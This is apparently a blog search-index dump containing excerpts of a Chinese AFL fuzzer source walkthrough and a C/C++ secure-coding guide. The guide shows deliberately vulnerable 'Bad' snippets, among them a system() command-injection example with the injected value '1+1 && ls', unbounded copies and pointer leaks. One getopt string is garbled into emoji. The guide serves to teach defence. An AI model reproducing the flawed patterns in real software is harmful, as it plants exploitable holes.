'as'，传递给as的参数 */ static u8* input_file; /* Originally specified input file ，输入文件 */ static u8* modified_file; /* Instrumented file for the real 'as'，as进行插桩处理的文件 */ static u8 be_quiet, /* Quiet mode (no stderr output) ，静默模式，没有标准输出 */ clang_mod","date":"0001-01-01","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:3:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"二、AFL 的插桩 —— llvm_mode ","date":"0001-01-01","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:4:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"（一）、LLVM 前置知识 LLVM 主要为了解决编译时多种多样的前端和后端导致编译环境复杂、苛刻的问题，其核心为设计了一个称为 LLVM IR 的中间表示，并以库的形式提供一些列接口，以提供诸如操作 IR 、生成目标平台代码等等后端的功能。其整体架构如下所示： 不同的前端和后端使用统一的中间代码LLVM InterMediate Representation(LLVM IR)，其结果就是如果需要支持一门新的编程语言，只需要实现一个新的前端；如果需要支持一款新的硬件设备，只需要实现一个新的后端；优化阶段为通用阶段，针对统一的 LLVM IR ，与新的编程语言和硬件设备无关。 GCC 的前后端耦合在一起，没有进行分离，所以GCC为了支持一门新的编程语言或一个新的硬件设备，需要重新开发前端到后端的完整过程。 Clang 是 LLVM 项目的一个子项目，它是 LLVM 架构下的 C/C++/Objective-C 的编译器，是 LLVM 前端的一部分。相较于GCC，具备编译速度快、占用内存少、模块化设计、诊断信息可读性强、设计清晰简单等优点。 最终从源码到机器码的流程如下（以 Clang 做编译器为例）： （LLVM Pass 是一些中间过程处理 IR 的可以用户自定义的内容，可以用来遍历、修改 IR 以达到插桩、优化、静态分析等目的。） 代码首先由编译器前端clang处理后得到中间代码IR，然后经过各 LLVM Pass 进行优化和转换，最终交给编译器后端生成机器码。 ","date":"0001-01-01","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:4:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"（二）、 AFL的afl-clang-fast 1. 概述 AFL的 llvm_mode 可以实现编译器级别的插桩，可以替代 afl-gcc 或 afl-clang 使用的比较“粗暴”的汇编级别的重写的方法，且具备如下几个优势： 编译器可以进行很多优化以提升效率； 可以实现CPU无关，可以在非 x86 架构上进行fuzz； 可以更好地处理多线程目标。 在AFL的 llvm_mode 文件夹下包含3个文件： afl-clang-fast.c ， afl-llvm-pass.so.cc， afl-llvm-rt.o.c。 afl-llvm-rt.o.c 文件主要是重写了 afl-as.h 文件中的 main_payload 部分，方便调用； afl-llvm-pass.so.cc 文件主要是当通过 afl-clang-fast 调用 clang 时，这个pass被插入到 LLVM 中，告诉编译器添加与 ``afl-as.h` 中大致等效的代码； afl-clang-fast.c 文件本质上是 clang 的 wrapper，最终调用的还是 clang 。但是与 afl-gcc 一样，会进行一些参数处理。 llvm_mode 的插桩思路就是通过编写pass来实现信息记录，对每个基本块都插入探针，具体代码在 afl-llvm-pass.so.cc 文件中，初始化和forkserver操作通过链接完成。 2. 源码 1. afl-clang-fast.c 1. main 函数 main 函数的全部逻辑如下： 主要是对 find_obj(), edit_params(), execvp() 函数的调用， 其中主要有以下三个函数的调用： find_obj(argv[0])：查找运行时library edit_params(argc, argv)：处理传入的编译参数，将确定好的参数放入 cc_params[] 数组 execvp(cc_params[0], (cahr**)cc_params)：替换进程空间，传递参数，执行要调用的clang 这里后两个函数的作用与 afl-gcc.c 中的作用基本相同，只是对参数的处理过程存在不同，不同的主要是 find_obj() 函数。 2. find_obj 函数 find_obj()函数的控制流逻辑如下： 首先，读取环境变量 AFL_PATH 的值： 如果读取成功，确认 AFL_PATH/afl-llvm-rt.o 是否可以访问；如果可以访问，设置该目录为 obj_path ，然后直接返回； 如果读取失败，检查 arg0 中是否存在 / 字符，如果存在，则判断最后一个 / 前面的路径为 AFL 的根目录；然后读取afl-llvm-rt.o文件，成功读取，设置该目录为 obj_path ，然后直接返回。 如果上面两种方式都失败，到/usr/local/lib/afl 目录下查找是否存在 afl-llvm-rt.o ，如果存在，则设置为 obj_path 并直接返回（之所以向该路径下寻找，是因为默认的AFL的MakeFile在编译时，会定义一个名为AFL_PATH的宏，该宏会指向该路径）； 如果以上全部失败，抛出异常提示找不到 afl-llvm-rt.o 文件或 afl-llvm-pass.so 文件，并要求设置 AFL_PATH 环境变量 。 函数的主要功能是在寻找AFL的路径以找到 afl-llvm-rt.o 文件，该文件即为要用到的运行时库。 3. edit_params 函数 该函数的主要作用仍然为编辑参数数组，其控制流程如下： 首先，判断执行的是否为 afl-clang-fast++ ： 如果是，设置 cc_params[0] 为环境变量 AFL_CXX；如果环境变量为空，则设置为 clang++ ； 如果不是，设置 cc_params[0] 为环境变量 AFL_CC；如果环境变量为空，则设置为 clang ； 判断是否定义了 USE_TRACE_PC 宏，如果有，添加 -fsanitize-coverage=trace-pc-guard -mllvm(only Android) -sanitizer-coverage-block-threshold=0(only Android) 选项到参数数组；如果没有，依次将 -Xclang -load -Xclang obj_path/afl-llvm-pass.so -Qunused-arguments 选项添加到参数数组；（这里涉及到llvm_mode使用的2种插桩方式：默认使用的是传统模式，使用 afl-llvm-pass.so 注入来进行插桩，这种方式较为稳定；另外一种是处于实验阶段的方式——trace-pc-guard 模式，对于该模式的详细介绍可以参考llvm相关文档——tracing-pcs-with-guards） 遍历传递给 afl-clang-fast 的参数，进行一定的检查和设置，并添加到 cc_params 数组： 如果存在 -m32 或 armv7a-linux-androideabi ，设置 bit_mode 为32； 如果存在 -m64 ，设置 bit_mode 为64； 如果存在 -x ，设置 x_set 为1； 如果存在 -fsanitize=address 或 -fsanitize=memory，设置 asan_set 为1； 如果存在 -Wl,-z,defs 或 -Wl,--no-undefined，则直接pass掉。 检查环境变量是否设置了 AFL_HARDEN： 如果有，添加 -fstack-protector-all 选项； 如果有且没有设置 FORTIFY_SOURCE ，添加 -D_FORTIFY_SOURCE=2 选项； 检查参数中是否存在 -fsanitize=memory，即 asan_set 为0： 如果没有，尝试读取环境变量 AFL_USE_ASAN，如果存在，添加 -U_FORTIFY_SOURCE -fsanitize=address； 接下来对环境变量AFL_USE_MSAN的处理方式与 AFL_USE_ASAN 类似，添加的选项为 -U_FORTIFY_SOURCE -fsanitize=memory； 检查是否定义了 USE_TRACE_PC 宏，如果存在定义，检查是否存在环境变量 AFL_INST_RATIO，如果存在，抛出异常AFL_INST_RATIO 无法在trace-pc时使用； 检查环境变量 AFL_NO_BUILTIN ，如果没有设置，添加 -g -O3 -funroll-loops； 检查环境变量 AFL_NO_BUILTIN，如果进行了设置，添加 -fno-builtin-strcmp -fno-builtin-strncmp -fno-builtin-strcasecmp -fno-builtin-strcasecmp -fno-builtin-memcmp； 添加参数 -D__AFL_HAVE_MANUAL_CONTROL=1 -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1； 定义了两个宏 __AFL_LOOP(), __AFL_INIT()； 检查是否设置了 x_set， 如果有添加 -x none； 检查是否设置了宏 __ANDORID__ ，如果没有，判断 bit_mode 的值： 如果为0，即没有-m32和-m64，添加 obj_path/afl-llvm-rt.o ； 如果为32，添加 obj_path/afl-llvm-rt-32.o ； 如果为64，添加 obj_path/afl-llvm-rt-64.o 。 2. afl-llvm-pass.so.cc afl-llvm-pass.so.cc 文件实现了 LLVM-mode 下的一个插桩 LLVM Pass。 本文不过多关心如何实现一个LLVM Pass，重点分析该pass的实现逻辑。 该文件只有一个Transform pass： AFLCoverage，继承自 ModulePass，实现了一个 runOnModule 函数，这也是我们需要重点分析的函数。 namespace { class AFLCoverage : public ModulePass { public: static char ID; AFLCoverage() : ModulePass(ID) { } bool runOnModule(Module \u0026M) override; // StringRef getPassName() const override { // return \"American Fuzzy Lop Instrumentation\"; // } }; } 1. pass注册 对pass进行注册的部分源码如下： static void registerAFLPass(const PassManagerBuilder \u0026, legacy::PassManagerBase \u0026PM) { PM.add(new AFLCoverage()); } static RegisterStandardPasses RegisterAFLPass( PassManagerBuilder::EP_ModuleOptimizerEarly, registerAFLPass); static RegisterStandardPasses RegisterAFLPass0( P","date":"0001-01-01","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:4:2","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"三、AFL的fuzzer —— afl-fuzz.c ","date":"0001-01-01","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:5:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"1. 、概述 AFL中最重要的部分便是fuzzer的实现部分——afl_fuzz.c ，其主要作用是通过不断变异测试用例来影响程序的执行路径。该文件代码量在8000行左右，处于篇幅原因，我们不会对每一个函数进行源码级分析，而是按照功能划分，介绍其中的核心函数。该文件属于AFL整个项目的核心中的核心，强烈建议通读该文件。 在介绍源码的同时，会穿插AFL的整体运行过程和设计思路，辅助理解源码的设计思路。 在功能上，可以总体上分为3部分： 初始配置：进行fuzz环境配置相关工作 fuzz执行：fuzz的主循环过程 变异策略：测试用例的变异过程和方式 我们将按照以上3个功能对其中的关键函数和流程进行分析。 ","date":"0001-01-01","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:5:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"2、核心源码分析 1. 初始配置 1.1 第一个while循环 while ((opt = getopt(argc, argv, \"+i⭕fⓜ️b:t:T:dnCB:S:M:x:QV\")) \u003e 0) ... ... 该循环主要通过 getopt 获取各种环境配置、选项参数等。 1.2 setup_signal_handlers 函数 调用 sigaction ，注册信号处理函数，设置信号句柄。具体的信号内容如下： 信号 作用 SIGHUP/SIGINT/SIGTERM 处理各种“stop”情况 SIGALRM 处理超时的情况 SIGWINCH 处理窗口大小 SIGUSER1 用户自定义信号，这里定义为skip request SIGSTP/SIGPIPE 不是很重要的一些信号，可以不用关心 1.3 check_asan_opts 函数 读取环境变量 ASAN_OPTIONS 和 MSAN_OPTIONS，做一些必要性检查。 1.4 fix_up_sync 函数 如果通过 -M或者-S指定了 sync_id，则更新 out_dir 和 sync_dir 的值：设置 sync_dir 的值为 out_dir，设置 out_dir 的值为out_dir/sync_id。 1.5 save_cmdline 函数 copy当前命令行参数，保存。 1.6 check_if_tty 函数 检查是否在tty终端上面运行：读取环境变量 AFL_NO_UI ，如果存在，设置 not_on_tty 为1，并返回；通过 ioctl 读取window size，如果报错为 ENOTTY，表示当前不在一个tty终端运行，设置 not_on_tty。 1.7 几个CPU检查相关的函数 static void get_core_count(void)get_core_count() ：获取核心数量 check_crash_handling()：确保核心转储不会进入程序 check_cpu_governor()：检查CPU管理者 1.8 setup_shm 函数 该函数用于设置共享内存和 virgin_bits，属于比较重要的函数，这里我们结合源码来解析一下： /* Configure shared memory and virgin_bits. This is called at startup. */ EXP_ST void setup_shm(void) { u8* shm_str; if (!in_bitmap) memset(virgin_bits, 255, MAP_SIZE); // 如果 in_bitmap 为空，调用 memset 初始化数组 virgin_bits[MAP_SIZE] 的每个元素的值为 ‘255’。 memset(virgin_tmout, 255, MAP_SIZE); // 调用 memset 初始化数组 virgin_tmout[MAP_SIZE] 的每个元素的值为 ‘255’。 memset(virgin_crash, 255, MAP_SIZE); // 调用 memset 初始化数组 virgin_crash[MAP_SIZE] 的每个元素的值为 ‘255’。 shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | 0600); // 调用 shmget 函数分配一块共享内存，并将返回的共享内存标识符保存到 shm_id if (shm_id \u003c 0) PFATAL(\"shmget() failed\"); atexit(remove_shm); // 注册 atexit handler 为 remove_shm shm_str = alloc_printf(\"%d\", shm_id); // 创建字符串 shm_str /* If somebody is asking us to fuzz instrumented binaries in dumb mode, we don't want them to detect instrumentation, since we won't be sending fork server commands. This should be replaced with better auto-detection later on, perhaps? */ if (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, 1); // 如果不是dumb_mode，设置环境变量 SHM_ENV_VAR 的值为 shm_str ck_free(shm_str); trace_bits = shmat(shm_id, NULL, 0); // 设置 trace_bits 并初始化为0 if (trace_bits == (void *)-1) PFATAL(\"shmat() failed\"); } 这里通过 trace_bits 和 virgin_bits 两个 bitmap 来分别记录当前的 tuple 信息及整体 tuple 信息，其中 trace_bits 位于共享内存上，便于进行进程间通信。通过 virgin_tmout 和 virgin_crash 两个 bitmap 来记录 fuzz 过程中出现的所有目标程序超时以及崩溃的 tuple 信息。 1.9 setup_dirs_fds 函数 该函数用于准备输出文件夹和文件描述符，结合源码进行解析： EXP_ST void setup_dirs_fds(void) { u8* tmp; s32 fd; ACTF(\"Setting up output directories...\"); if (sync_id \u0026\u0026 mkdir(sync_dir, 0700) \u0026\u0026 errno != EEXIST) PFATAL(\"Unable to create '%s'\", sync_dir); /* 如果sync_id，且创建sync_dir文件夹并设置权限为0700，如果报错单errno不是 EEXIST ，抛出异常 */ if (mkdir(out_dir, 0700)) { // 创建out_dir， 权限为0700 if (errno != EEXIST) PFATAL(\"Unable to create '%s'\", out_dir); maybe_delete_out_dir(); } else { if (in_place_resume) // 创建成功 FATAL(\"Resume attempted but old output directory not found\"); out_dir_fd = open(out_dir, O_RDONLY); // 以只读模式打开，返回fd：out_dir_fd #ifndef __sun if (out_dir_fd \u003c 0 || flock(out_dir_fd, LOCK_EX | LOCK_NB)) PFATAL(\"Unable to flock() output directory.\"); #endif /* !__sun */ } /* Queue directory for any starting \u0026 discovered paths. */ tmp = alloc_printf(\"%s/queue\", out_dir); if (mkdir(tmp, 0700)) PFATAL(\"Unable to create '%s'\", tmp); // 创建 out_dir/queue 文件夹，权限为0700 ck_free(tmp); /* Top-level directory for queue metadata used for session resume and related tasks. */ tmp = alloc_printf(\"%s/queue/.state/\", out_dir); // 创建 out_dir/queue/.state 文件夹，用于保存session resume 和相关tasks的队列元数据。 if (mkdir(tmp, 0700)) PFATAL(\"Unable to create '%s'\", tmp); ck_free(tmp); /* Directory for flagging queue entries that went through deterministic fuzzing in the past. */ tmp = alloc_printf(\"%s/queue/.state/deterministic_done/\", out_dir); if (mkdir(tmp, 0700)) PFATAL(\"Unable to create '%s'\", tmp); ck_free(tmp); /* Directory with the auto-selected dictionary entries. */ tmp = alloc_printf(\"%s/queue/.state/auto_extras/\", out_dir); if (mkdir(tmp, 0700)) PFATAL(\"Unable to create '%s'\", tmp); ck_free(tmp); /* The set of paths currently deemed redund","date":"0001-01-01","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:5:2","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"四、总结 分析完源码，可以感受到，AFL遵循的基本原则是简单有效，没有进行过多的复杂的优化，能够针对fuzz领域的痛点，对症下药，拒绝花里胡哨，给出切实可行的解决方案，在漏洞挖掘领域的意义的确非同凡响。后期的很多先进的fuzz工具基本沿用了AFL的思路，甚至目前为止已基本围绕AFL建立了“生态圈”，涉及到多个平台、多种漏洞挖掘对象，对于安全研究员来说实属利器，值得从事fuzz相关工作的研究员下足功夫去体会AFL的精髓所在。 考虑到篇幅限制，我们没有对AFL中的变异策略进行源码说明，实属遗憾。如果有机会，将新开文章详细介绍AFL的变异策略和源码分析。 ","date":"0001-01-01","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:6:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"五、参考文献 http://lcamtuf.coredump.cx/afl/ https://eternalsakura13.com/2020/08/23/afl/ https://bbs.pediy.com/thread-265936.htm https://bbs.pediy.com/thread-249912.htm#msg_header_h3_3 ","date":"0001-01-01","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:7:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Development"],"content":"通用安全编码指南 C/C++篇","date":"2021-01-04","objectID":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/"},{"categories":["Development"],"content":"收集于github，通用安全编码指南系列第一篇：C/C++，总结概述在C/C ++编码过程中常见的安全问题和应该采取的安全编码格式。 目录 1 通用安全指南 I. C/C++使用错误 1.1 不得直接使用无长度限制的字符拷贝函数 1.2 创建进程类的函数的安全规范 1.3 尽量减少使用 _alloca 和可变长度数组 1.4 printf系列参数必须对应 1.5 防止泄露指针（包括%p）的值 1.6 不应当把用户可修改的字符串作为printf系列函数的“format”参数 1.7 对数组delete时需要使用delete[] 1.8 注意隐式符号转换 1.9 注意八进制问题 II. 不推荐的编程习惯 2.1 switch中应有default 2.2 不应当在Debug或错误信息中提供过多内容 2.3 不应该在客户端代码中硬编码对称加密秘钥 2.4 返回栈上变量的地址 2.5 有逻辑联系的数组必须仔细检查 2.6 避免函数的声明和实现不同 2.7 检查复制粘贴的重复代码 2.8 左右一致的重复判断/永远为真或假的判断 2.9 函数每个分支都应有返回值 2.10 不得使用栈上未初始化的变量 2.11 不得直接使用刚分配的未初始化的内存（如realloc） 2.12 校验内存相关函数的返回值 2.13 不要在if里面赋值 2.14 确认if里面的按位操作 III. 多线程 3.1 变量应确保线程安全性 3.2 注意signal handler导致的条件竞争 3.3 注意Time-of-check Time-of-use条件竞争 IV. 加密解密 4.1 不得明文存储用户密码等敏感数据 4.2 内存中的用户密码等敏感数据应该安全抹除 4.3 rand() 类函数应正确初始化 4.4 在需要高强度安全加密时不应使用弱PRNG函数 4.5 自己实现的rand范围不应过小 V. 文件操作 5.1 避免路径穿越问题 5.2 避免相对路径导致的安全问题 5.3 文件权限控制 Ⅵ. 文件操作 6.1 防止各种越界写 6.2 防止任意地址写 Ⅶ. 文件操作 7.1 防止整数溢出 7.2 防止Off-By-One 7.3 避免大小端错误 7.4 检查除以零异常 7.5 防止数字类型的错误强转 7.6 比较数据大小时加上最小/最大值的校验 Ⅷ. 文件操作 8.1 检查在pointer上使用sizeof 8.2 检查直接将数组和0比较的代码 8.3 不应当向指针赋予写死的地址 8.4 检查空指针 8.5 释放完后置空指针 8.6 防止错误的类型转换 8.7 智能指针使用安全 ","date":"2021-01-04","objectID":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/:0:0","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/"},{"categories":["Development"],"content":"通用安全指南 ","date":"2021-01-04","objectID":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/:1:0","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/"},{"categories":["Development"],"content":"1 C/C++ 使用错误 1.1 【必须】不得直接使用无长度限制的字符拷贝函数 不应直接使用legacy的字符串拷贝、输入函数，如strcpy、strcat、sprintf、wcscpy、mbscpy等，这些函数的特征是：可以输出一长串字符串，而不限制长度。如果环境允许，应当使用其_s安全版本替代，或者使用n版本函数（如：snprintf，vsnprintf）。 若使用形如sscanf之类的函数时，在处理字符串输入时应当通过%10s这样的方式来严格限制字符串长度，同时确保字符串末尾有\\0。如果环境允许，应当使用_s安全版本。 但是注意，虽然MSVC 2015时默认引入结尾为0版本的snprintf（行为等同于C99定义的snprintf）。但更早期的版本中，MSVC的snprintf可能是_snprintf的宏。而_snprintf是不保证\\0结尾的（见本节后半部分）。 （MSVC） Beginning with the UCRT in Visual Studio 2015 and Windows 10, snprintf is no longer identical to _snprintf. The snprintf function behavior is now C99 standard compliant. 从Visual Studio 2015和Windows 10中的UCRT开始，snprintf不再与_snprintf相同。snprintf函数行为现在符合C99标准。 请参考：https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/snprintf-snprintf-snprintf-l-snwprintf-snwprintf-l?redirectedfrom=MSDN\u0026view=vs-2019 因此，在使用n系列拷贝函数时，要确保正确计算缓冲区长度，同时，如果你不确定是否代码在各个编译器下都能确保末尾有0时，建议可以适当增加1字节输入缓冲区，并将其置为\\0，以保证输出的字符串结尾一定有\\0。 // Good char buf[101] = {0}; snprintf(buf, sizeof(buf) - 1, \"foobar ...\", ...); 一些需要注意的函数，例如strncpy和_snprintf是不安全的。 strncpy不应当被视为strcpy的n系列函数，它只是恰巧与其他n系列函数名字很像而已。strncpy在复制时，如果复制的长度超过n，不会在结尾补\\0。 同样，MSVC _snprintf系列函数在超过或等于n时也不会以0结尾。如果后续使用非0结尾的字符串，可能泄露相邻的内容或者导致程序崩溃。 // Bad char a[4] = {0}; _snprintf(a, 4, \"%s\", \"AAAA\"); foo = strlen(a); 上述代码在MSVC中执行后， a[4] == ‘A’，因此字符串未以0结尾。a的内容是\"AAAA\"，调用strlen(a)则会越界访问。因此，正确的操作举例如下： // Good char a[4] = {0}; _snprintf(a, sizeof(a), \"%s\", \"AAAA\"); a[sizeof(a) - 1] = '\\0'; foo = strlen(a); 在 C++ 中，强烈建议用 string、vector 等更高封装层次的基础组件代替原始指针和动态数组，对提高代码的可读性和安全性都有很大的帮助。 关联漏洞: 中风险-信息泄露 低风险-拒绝服务 高风险-缓冲区溢出 1.2 【必须】创建进程类的函数的安全规范 system、WinExec、CreateProcess、ShellExecute等启动进程类的函数，需要严格检查其参数。 启动进程需要加上双引号，错误例子： // Bad WinExec(\"D:\\\\program files\\\\my folder\\\\foobar.exe\", SW_SHOW); 当存在D:\\program files\\my.exe的时候，my.exe会被启动。而foobar.exe不会启动。 // Good WinExec(\"\\\"D:\\\\program files\\\\my folder\\\\foobar.exe\\\"\", SW_SHOW); 另外，如果启动时从用户输入、环境变量读取组合命令行时，还需要注意是否可能存在命令注入。 // Bad std::string cmdline = \"calc \"; cmdline += user_input; system(cmdline.c_str()); 比如，当用户输入1+1 \u0026\u0026 ls时，执行的实际上是calc 1+1和ls 两个命令，导致命令注入。 需要检查用户输入是否含有非法数据。 // Good std::string cmdline = \"ls \"; cmdline += user_input; if(cmdline.find_first_not_of(\"1234567890.+-*/e \") == std::string::npos) system(cmdline.c_str()); else warning(...); 关联漏洞: 高风险-代码执行 高风险-权限提升 1.3 【必须】尽量减少使用 _alloca 和可变长度数组 _alloca 和可变长度数组使用的内存量在编译期间不可知。尤其是在循环中使用时，根据编译器的实现不同，可能会导致：（1）栈溢出，即拒绝服务； （2）缺少栈内存测试的编译器实现可能导致申请到非栈内存，并导致内存损坏。这在栈比较小的程序上，例如IoT设备固件上影响尤为大。对于 C++，可变长度数组也属于非标准扩展，在代码规范中禁止使用。 错误示例： // Bad for (int i = 0; i \u003c 100000; i++) { char* foo = (char *)_alloca(0x10000); ..do something with foo ..; } void Foo(int size) { char msg[size]; // 不可控的栈溢出风险！ } 正确示例： // Good // 改用动态分配的堆内存 for (int i = 0; i \u003c 100000; i++) { char * foo = (char *)malloc(0x10000); ..do something with foo ..; if (foo_is_no_longer_needed) { free(foo); foo = NULL; } } void Foo(int size) { std::string msg(size, '\\0'); // C++ char* msg = malloc(size); // C } 关联漏洞: 低风险-拒绝服务 高风险-内存破坏 1.4 【必须】printf系列参数必须对应 所有printf系列函数，如sprintf，snprintf，vprintf等必须对应控制符号和参数。 错误示例： // Bad const int buf_size = 1000; char buffer_send_to_remote_client[buf_size] = {0}; snprintf(buffer_send_to_remote_client, buf_size, \"%d: %p\", id, some_string); // %p 应为 %s buffer_send_to_remote_client[buf_size - 1] = '\\0'; send_to_remote(buffer_send_to_remote_client); 正确示例： // Good const int buf_size = 1000; char buffer_send_to_remote_client[buf_size] = {0}; snprintf(buffer_send_to_remote_client, buf_size, \"%d: %s\", id, some_string); buffer_send_to_remote_client[buf_size - 1] = '\\0'; send_to_remote(buffer_send_to_remote_client); 前者可能会让client的攻击者获取部分服务器的原始指针地址，可以用于破坏ASLR保护。 关联漏洞: 中风险-信息泄露 1.5 【必须】防止泄露指针（包括%p）的值 所有printf系列函数，要防止格式化完的字符串泄露程序布局信息。例如，如果将带有%p的字符串泄露给程序，则可能会破坏ASLR的防护效果。使得攻击者更容易攻破程序。 %p的值只应当在程序内使用，而不应当输出到外部或被外部以某种方式获取。 错误示例： // Bad // 如果这是暴露给客户的一个API： uint64_t GetUniqueObjectId(const Foo* pobject) { return (uint64_t)pobject; } 正确示例： // Good uint64_t g_object_id = 0; void Foo::Foo() { this-\u003eobject_id_ = g_object_id++; } // 如果这是暴露给客户的一个API： uint64_t GetUniqueObjectId(const Foo* objec","date":"2021-01-04","objectID":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/:1:1","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97-c-c-/"},{"categories":["Development"],"content":"2 不推荐的编程习惯 2.1 【必须】switch中应有default switch中应该有default，以处理各种预期外的情况。这可以确保switch接受用户输入，或者后期在其他开发者修改函数后确保switch仍可以覆盖到所有情况，并确保逻辑正常运行。 // Bad int Foo(int bar) { switch (bar \u0026 7) { case 0: return Foobar(bar); break; case 1: return Foobar(bar * 2); break; } } 例如上述代码switch的取值可能从0～7，所以应当有default： // Good int Foo(int bar) { switch (bar \u0026 7) { case 0: return Foobar(bar); break; case 1: return Foobar(bar * 2); break; default: return -1; } } 关联漏洞: 中风险-逻辑漏洞 中风险-内存泄漏 2.2 【必须】不应当在Debug或错误信息中提供过多内容 包含过多信息的Debug消息不应当被用户获取到。Debug信息可能会泄露一些值，例如内存数据、内存地址等内容，这些内容可以帮助攻击者在初步控制程序后，更容易地攻击程序。 // Bad int Foo(int* bar) { if (bar \u0026\u0026 *bar == 5) { OutputDebugInfoToUser(\"Wrong value for bar %p = %d\\n\", bar, *bar); } } 而应该： // Good int foo(int* bar) { #ifdef DEBUG if (bar \u0026\u0026 *bar == 5) { OutputDebugInfo(\"Wrong value for bar.\\n\", bar, *bar); } #endif } 关联漏洞: 中风险-信息泄漏 2.3 【必须】不应该在客户端代码中硬编码对称加密秘钥 不应该在客户端代码中硬编码对称加密秘钥。例如：不应在客户端代码使用硬编码的 AES/ChaCha20-Poly1305/SM1 密钥，使用固定密钥的程序基本和没有加密一样。 如果业务需求是认证加密数据传输，应优先考虑直接用 HTTPS 协议。 如果是其它业务需求，可考虑由服务器端生成对称秘钥，客户端通过 HTTPS 等认证加密通信渠道从服务器拉取。 或者根据用户特定的会话信息，比如登录认证过程可以根据用户名用户密码业务上下文等信息，使用 HKDF 等算法衍生出对称秘钥。 又或者使用 RSA/ECDSA + ECDHE 等进行认证秘钥协商，生成对称秘钥。 // Bad char g_aes_key[] = {...}; void Foo() { .... AES_func(g_aes_key, input_data, output_data); } 可以考虑在线为每个用户获取不同的密钥： // Good char* g_aes_key; void Foo() { .... AES_encrypt(g_aes_key, input_data, output_data); } void Init() { g_aes_key = get_key_from_https(user_id, ...); } 关联漏洞: 中风险-信息泄露 2.4 【必须】返回栈上变量的地址 函数不可以返回栈上的变量的地址，其内容在函数返回后就会失效。 // Bad char* Foo(char* sz, int len){ char a[300] = {0}; if (len \u003e 100) { memcpy(a, sz, 100); } a[len] = '\\0'; return a; // WRONG } 而应当使用堆来传递非简单类型变量。 // Good char* Foo(char* sz, int len) { char* a = new char[300]; if (len \u003e 100) { memcpy(a, sz, 100); } a[len] = '\\0'; return a; // OK } 对于 C++ 程序来说，强烈建议返回 string、vector 等类型，会让代码更加简单和安全。 关联漏洞: 高风险-内存破坏 2.5 【必须】有逻辑联系的数组必须仔细检查 例如下列程序将字符串转换为week day，但是两个数组并不一样长，导致程序可能会越界读一个int。 // Bad int nWeekdays[] = {1, 2, 3, 4, 5, 6}; const char* sWeekdays[] = {\"Mon\", \"Tue\", \"Wed\", \"Thu\", \"Fri\", \"Sat\", \"Sun\"}; for (int x = 0; x \u003c ARRAY_SIZE(sWeekdays); x++) { if (strcmp(sWeekdays[x], input) == 0) return nWeekdays[x]; } 应当确保有关联的nWeekdays和sWeekdays数据统一。 // Good const int nWeekdays[] = {1, 2, 3, 4, 5, 6, 7}; const char* sWeekdays[] = {\"Mon\", \"Tue\", \"Wed\", \"Thu\", \"Fri\", \"Sat\", \"Sun\"}; assert(ARRAY_SIZE(nWeekdays) == ARRAY_SIZE(sWeekdays)); for (int x = 0; x \u003c ARRAY_SIZE(sWeekdays); x++) { if (strcmp(sWeekdays[x], 